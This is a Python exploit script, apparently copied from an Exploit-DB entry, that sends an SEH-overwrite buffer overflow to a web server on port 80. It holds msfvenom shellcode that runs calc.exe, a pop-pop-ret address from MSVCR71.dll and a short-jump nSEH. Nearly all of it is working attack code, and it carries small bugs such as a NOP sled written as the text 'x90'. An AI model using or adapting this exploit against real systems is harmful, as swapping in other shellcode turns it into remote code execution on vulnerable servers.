#!/usr/bin/env python
# https://www.exploit-db.com/exploits/47412

import socket
from struct import pack

IP = "127.0.0.1"
port = 80


# msfvenom -p 'windows/exec' CMD=calc.exe EXITFUNC=seh  -f python -b '\x00'
buf =  b""
buf += b"\xdd\xc2\xba\xb0\xa4\x0c\x6c\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x53\x14\x03\x53"
buf += b"\xa4\x46\xf9\x90\x2c\x04\x02\x69\xac\x69\x8a\x8c"
buf += b"\x9d\xa9\xe8\xc5\x8d\x19\x7a\x8b\x21\xd1\x2e\x38"
buf += b"\xb2\x97\xe6\x4f\x73\x1d\xd1\x7e\x84\x0e\x21\xe0"
buf += b"\x06\x4d\x76\xc2\x37\x9e\x8b\x03\x70\xc3\x66\x51"
buf += b"\x29\x8f\xd5\x46\x5e\xc5\xe5\xed\x2c\xcb\x6d\x11"
buf += b"\xe4\xea\x5c\x84\x7f\xb5\x7e\x26\xac\xcd\x36\x30"
buf += b"\xb1\xe8\x81\xcb\x01\x86\x13\x1a\x58\x67\xbf\x63"
buf += b"\x55\x9a\xc1\xa4\x51\x45\xb4\xdc\xa2\xf8\xcf\x1a"
buf += b"\xd9\x26\x45\xb9\x79\xac\xfd\x65\x78\x61\x9b\xee"
buf += b"\x76\xce\xef\xa9\x9a\xd1\x3c\xc2\xa6\x5a\xc3\x05"
buf += b"\x2f\x18\xe0\x81\x74\xfa\x89\x90\xd0\xad\xb6\xc3"
buf += b"\xbb\x12\x13\x8f\x51\x46\x2e\xd2\x3f\x99\xbc\x68"
buf += b"\x0d\x99\xbe\x72\x21\xf2\x8f\xf9\xae\x85\x0f\x28"
buf += b"\x8b\x74\xe1\xe1\x01\xe0\x58\x90\x68\x6c\x5b\x4e"
buf += b"\xae\x89\xd8\x7b\x4e\x6e\xc0\x09\x4b\x2a\x46\xe1"
buf += b"\x21\x23\x23\x05\x96\x44\x66\x66\x79\xd7\xea\x47"
buf += b"\x1c\x5f\x88\x97"


seh = "\x7f\xa6\x38\x7c" # pop pop ret of MSVCR71.dll
nseh = "\xEB\x06\x90\x90" # JMP SHORT 8 
nop = "x90" * 100 

payload = "A" * 1040 + nseh + seh + nop + buf + "D" * (5000 - 1040 - 8 - len(nop) - len(buf))

header = "POST " + payload
header +=" HTTP/1.0\r\n\r\n"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(header)
    print("[+] Payload sent")
except:
    print("[-] Failed Sent")

